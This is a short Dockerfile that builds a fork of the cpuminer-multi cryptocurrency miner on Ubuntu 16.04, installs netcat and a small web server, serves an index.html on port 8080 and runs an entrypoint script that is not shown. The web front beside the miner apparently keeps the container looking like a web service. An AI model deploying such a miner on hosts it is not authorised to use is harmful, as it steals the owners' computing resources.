FROM ubuntu:16.04
MAINTAINER trompettokun

ENV DEBIAN_FRONTEND noninteractive
RUN		apt-get update -qq

RUN		apt-get install -qy automake autoconf pkg-config libcurl4-openssl-dev libssl-dev libjansson-dev libgmp-dev make g++ git netcat webfs

RUN		git clone https://github.com/trompetto/cpuminer-multi

RUN		cd cpuminer-multi &&\
		bash autogen.sh &&\
		bash configure --disable-aes-ni &&\
		make

ADD entrypoint.sh /entrypoint.sh
RUN		chmod +x /entrypoint.sh
ADD webserver.sh /webserver.sh
RUN		chmod +x /webserver.sh
RUN touch /etc/mime.types
#nc -l 8080  
ADD index.html /index.html

EXPOSE		8080

ENTRYPOINT	["/entrypoint.sh"]
